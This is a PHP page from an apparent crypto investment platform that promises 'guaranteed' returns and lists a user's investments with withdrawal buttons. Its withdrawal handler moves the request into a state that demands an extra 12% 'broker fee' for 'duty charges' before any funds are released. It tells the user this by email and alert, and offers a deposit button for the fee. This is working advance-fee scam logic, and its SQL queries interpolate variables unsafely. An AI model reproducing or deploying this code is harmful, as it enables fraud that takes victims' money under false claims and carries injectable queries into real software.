<?php

 include('../inc/settings.php'); 


if( !loggedin() ){

    echo "<script> window.location.replace(\"../login.php\"); </script>";
  }

?>

<!DOCTYPE html>
<html>


<head>
<meta charset="utf-8">
<meta name="description" content="<?= $site_name; ?> is an investment company located at <?= $site_address; ?>. It was incorporated on the 17th of August, 2017, which aims to reach out to Everyone, offering a guarnteed return on every investment which cuts across all social classes so that no one is left behind. <?= $site_name; ?> is an investment platform where returns are gotten as early as 14 days with a guaranteed return; People help People. We engage in real estate investment and development 30 years of experience in cunstruction services, crypto currency investment, architecture, manufacturing , structural engineering and Forex trading">
<meta name="keywords" content="consulting, accountant, advisor, audit, beaver builder, broker, business, clean, company, consulting, corporate, finance, financial, insurance, trader">
<meta name="author" content="<?= $site_name; ?>">
<title>Investment History -- <?= $site_name; ?></title>

<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">

<?php

include('../frm/header.php');


?>


<div class="page-wrapper">



<div class="container-fluid">



<div class="row page-titles">
<div class="col-md-5 align-self-center"><br><br>
<h3 class="text-themecolor text-uppercase">Investment History</h3>
<ol class="breadcrumb">
<li class="breadcrumb-item"><a href="dashboard.php">Home</a></li>
<li class="breadcrumb-item active">Investment History</li>
</ol>
</div>
</div>






<div class="row">
<div class="col-12">
<div class="card">
<div class="card-body">
<h4 class="card-title">Investment History</h4>
<h6 class="card-subtitle"></h6>
<div class="table-responsive mt-40">
<table id="example23" class="display nowrap table table-hover table-striped table-bordered">
<thead>
<tr>
<td>S/N</td>
<th>Investment Ref</th>
<th>Amount</th>
<th>Daily Growth</th>
<th>Expected Profit($)</th>
<th>Status</th>
<th>Action</th>
<th>Start Date</th>
<th>Expiry Date</th>

</tr>


</thead>
<tbody>


<?php 
								$deposite_tran = new run_query("select * from transaction where tran_user_id = '$user_id' and tran_desc ='INVESTMENT'  order by tran_id desc  ");
								$no = 1;
							while(	$deposite_tran_data =	$deposite_tran->result() ){
							
								extract($deposite_tran_data );

								$t12_percent = $trant_amt * 0.12;
								
								$t1 = strtotime($start_tran_date);
								$t2 = strtotime($reg_Date);
								$diff = $t2 -$t1;
								$days_online_d =  $diff  /86400;
								$duration = round($days_online_d);
								$tran_current_bal_u  = ($duration *  $tran_daily_growth    ) - $tran_withdraw_amt;
								
								$tran_current_bal_u =  number_format( $tran_current_bal_u,4);
								if($duration >=7){
								$tran_current_bal_u  = ( 7 *  $tran_daily_growth  ) - $tran_withdraw_amt;
								}
								if( $duration >= 1  && $tran_current_bal_u > 0 ) {

									if($tran_status =='ACTIVE'){
										$btn ="<br/> <form method='POST'>  
								
									<input type='radio' name='coin$tran_id' required value='BTC' /> BTC <br/>
									<input type='radio' name='coin$tran_id' required value='ETH' /> ETH <br/>
									<button type='submit'  name='set_r$tran_id' class='btn btn-sm btn-danger' >Withdraw</button> 
								</form>";

									}elseif($tran_status =='ACTIVE_R'){

										$btn ="<br/> <form method='POST' action='make_deposit1.php'>  
								
									<input type='hidden' name='fund_amt' required readonly value='$t12_percent' /> 
									<input type='radio' name='coin_fund' required value='BTC' /> BTC <br/>
									<input type='radio' name='coin_fund' required value='ETH' /> ETH <br/>
									<button type='submit'  name='dep_btn_m' class='btn btn-sm btn-primary' >Deposit $ $t12_percent</button> <br/><span style='color:red;'>
									An additional 12% ($ $t12_percent) broker fee<br/>
									 must be paid to the broker to<br/>
									  clear duty charges before these <br/>
									  funds would reflect in your wallet.</span>
								</form>";


									}elseif($tran_status =='ACTIVE_C'){
										$btn ="<br/> <form method='POST'>  
								
									<input type='radio' name='coin$tran_id' required value='BTC' /> BTC <br/>
									<input type='radio' name='coin$tran_id' required value='ETH' /> ETH <br/>
									<button type='submit'  name='cash_out$tran_id' class='btn btn-sm btn-success' >Withdraw</button> 
								</form>";

									}
								
								}else{
								
								$btn ="<br/><button  class='btn btn-sm btn-danger' disabled > <b>WITHDRAW </b> </button>";
								}

									$tran_status ="In Progress";
								
								
								if($duration >= 7){
								$tran_current_bal_u  = ( 7 *  $tran_daily_growth  ) - $tran_withdraw_amt;
								$tran_status ="Expired";
								$duration ="Expired";
								}
								echo"
								
							<tr>
								<td>$no</td>
								<th>$tran_invoice</th>
								<th>$$trant_amt</th>
								<th>$coin</th>
								<th>$$tran_roi</th>
								<th><span class='badge badge-primary'><i class='fa fa-spinner'></i> $tran_status</span> </th>
								<th>$$tran_current_bal_u  $btn  </th>
								<th>$start_tran_date  </th>
								<th>$tran_exp_date  </th>
								</tr>	
								
								";
								$no++;


								//setting recommit
								
								if(isset($_POST['set_r'.$tran_id]))  {
										$coin = addslashes(htmlentities($_POST['coin'.$tran_id]));
    
							$qw1RRqq = new run_query("UPDATE   `transaction`  set  tran_status='ACTIVE_R' where  tran_id ='$tran_id' ");
							
						
							
								$email_amt = $trant_amt;
							 
								

								$site_email_send = "$site_email";		
								$welcome_email_subject = "Withdrawal of - $ $trant_amt | $site_name - needs Broker fee ";
								$welcome_email_headers .= "Content-type:text/html;charset=UTF-8 \r\n";
								$welcome_email_headers .= "From: $site_name";	
								
								
								 $welcome_email_body = "
								
									<html>
									<head>
										<title> Hello $user_name, </title>
									</head>
									<body>
									 <b>Hello, $user_name<b> <br/> Hope we meet you well.
									<h2> You Have Requested for the withdrwal  of $ $trant_amt  </h2>
									Your withdrawal request of $ $trant_amt was successful and the requested funds would be deposited to your wallet. An additional 12% broker fee must be paid to the broker to clear duty charges before these funds would reflect in your wallet. <br/>



									Enjoy your earnings.

									
									<hr/>
									For enquiries, <br/>
									Contact us on <br/>
								
									<b>
									$site_email <br/>
								
									$site_phone <br/>
									</b>
									Visit us on <br/>
								
									$site_link <br/><br/><br/>
								
									Regards,  $site_name.
									</body>
									</html>
								
									";
								
									 mail($user_email,$welcome_email_subject,$welcome_email_body,$welcome_email_headers);
									  
								 echo "<script>alert('Your withdrawal request of $ $trant_amt was successful and the requested funds would be deposited to your wallet. An additional 12% broker fee must be paid to the broker to clear duty charges before these funds would reflect in your wallet');</script>"; 
							 
						echo "<script>window.location.replace(\"investments.php\");</script>"; 


						 }
						 //setting recommit ends here






								
									if(isset($_POST['cash_out'.$tran_id]))  {
										$coin = addslashes(htmlentities($_POST['coin'.$tran_id]));
    
							$qw1RRqq = new run_query("UPDATE   `transaction`  set  tran_withdraw_amt=tran_withdraw_amt+$tran_current_bal_u  where  tran_id ='$tran_id' ");
							
							$timer_end  = date('Y-m-d H:i:s',strtotime('48 hours') );
							$timer_start  = date('Y-m-d H:i:s' );
							$tran_invoice  = "WIT-".date('iYdmhs' );
							$cash_out = new run_query("INSERT INTO    `transaction`  set coin='$coin',  tran_user_id = '$user_id', tran_invoice='$tran_invoice',
							tran_email='$user_email', tran_username='$user_name', trant_amt='$tran_current_bal_u',start_tran_date='$timer_start', tran_exp_date='$timer_end',  tran_date='$reg_Date', tran_status='PENDING', tran_desc ='CASH_OUT' ");
							
								$email_amt = $trant_amt;
							 
								

								$site_email_send = "info@KretoInvestment.com";		
								$welcome_email_subject = "Withdrawal of - $ $trant_amt | KretoInvestment";
								$welcome_email_headers .= "Content-type:text/html;charset=UTF-8 \r\n";
								$welcome_email_headers .= "From: $site_name";	
								
								
								 $welcome_email_body = "
								
									<html>
									<head>
										<title> Hello $user_name, </title>
									</head>
									<body>
									 <b>Hello, $user_name<b> <br/> Hope we meet you well.
									<h2> You Have Requested for the withdrwal  of $ $trant_amt  </h2>
									Please Relax as we Processed this Transaction <br/>
									
									<hr/>
									For enquiries, <br/>
									Contact us on <br/>
								
									<b>
									$site_email <br/>
								
									$site_phone <br/>
									</b>
									Visit us on <br/>
								
									https://$site_name.com <br/><br/><br/>
								
									Regards,  $site_name.
									</body>
									</html>
								
									";
								
									 mail($user_email,$welcome_email_subject,$welcome_email_body,$welcome_email_headers);
									  
								 echo "<script>alert(\"TRANSACTION WITHDRAW REQUEST SUCCESSFULL!!! \");</script>"; 
							 
						echo "<script>window.location.replace(\"withdrawals.php\");</script>"; 


						 }
						 
						 
							}
							
							?>


</tbody>
<tfoot>
<tr>
<td>S/N</td>
<th>Investment Ref</th>
<th>Amount</th>
<th>Daily Growth</th>
<th>Expected Profit($)</th>
<th>Status</th>
<th>Action</th>
<th>Start Date</th>
<th>Expiry Date</th>

</tr>
</tfoot>
</table>
</div>
</div>
</div>
</div>
</div>


 


</div>






<footer class="footer">
© 2020 <?= $site_name; ?> </footer>



</div>



</div>






<?php

include('../frm/footer.php');


?>
</body>
</html>